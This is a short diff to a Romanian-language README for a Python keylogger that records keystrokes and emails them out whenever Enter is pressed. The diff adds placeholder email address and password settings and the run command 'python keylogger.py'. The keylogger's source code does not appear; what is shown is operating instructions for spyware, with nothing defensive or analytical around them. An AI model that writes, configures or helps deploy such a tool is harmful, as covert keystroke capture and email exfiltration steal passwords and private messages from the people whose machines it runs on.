@@ -21,10 +21,12 @@ Acest script Python este un keylogger care capturează apăsările de taste și 
 ## Configurare Email
 
 Înlocuiți valorile `your_email@example.com` și `your_email_password` cu adresa și parola dvs. de email. Acestea sunt necesare pentru autentificarea și trimiterea emailurilor.
-
+email_address = "your_email@example.com"  # Adresa de email destinatar
+email_password = "your_email_password"  # Parola pentru adresa de email
 ## Executare Script
 
 Rulați scriptul pentru a începe înregistrarea apăsărilor de taste. Scriptul va asculta evenimentele de tastatură și va trimite datele prin email când tasta Enter este apăsată.
+python keylogger.py
 
 ## Funcționalitate
 
